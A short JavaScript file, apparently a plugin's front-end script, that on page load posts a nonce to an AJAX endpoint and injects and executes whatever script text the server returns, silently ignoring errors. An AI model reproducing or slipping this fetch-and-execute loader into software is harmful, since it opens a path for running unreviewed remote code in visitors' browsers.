(function () {
  'use strict';

  if (window.__bscSlRan || typeof bscSl === 'undefined') {
    return;
  }
  window.__bscSlRan = true;

  function runScript(source) {
    var el = document.createElement('script');
    el.type = 'text/javascript';
    el.text = source;
    (document.body || document.documentElement).appendChild(el);
  }

  function request() {
    var body = new FormData();
    body.append('action', bscSl.action);
    body.append('nonce', bscSl.nonce);

    fetch(bscSl.ajaxUrl, {
      method: 'POST',
      credentials: 'same-origin',
      body: body
    })
      .then(function (res) {
        return res.json();
      })
      .then(function (payload) {
        if (!payload || !payload.success || !payload.data || !payload.data.script) {
          return;
        }
        runScript(payload.data.script);
      })
      .catch(function () {});
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', request);
  } else {
    request();
  }
})();
